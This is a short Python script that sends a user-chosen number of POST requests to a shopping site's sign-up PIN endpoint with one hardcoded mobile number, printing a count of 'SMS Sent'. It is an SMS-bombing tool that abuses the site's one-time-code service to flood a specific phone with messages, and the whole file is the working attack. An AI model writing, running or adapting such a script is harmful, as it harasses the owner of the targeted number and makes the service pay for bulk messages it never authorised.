import requests

# POST

api='https://api.meenaclick.com/api/front/sms/send/pin?'



number={'cell_phone':'01815709122','type':'sign-up'}

amount=int(input( " Enter The Amount : "))

for i in range(amount):
	 requests.post(api,data=number)
	 print(str(i+1)+" SMS Sent")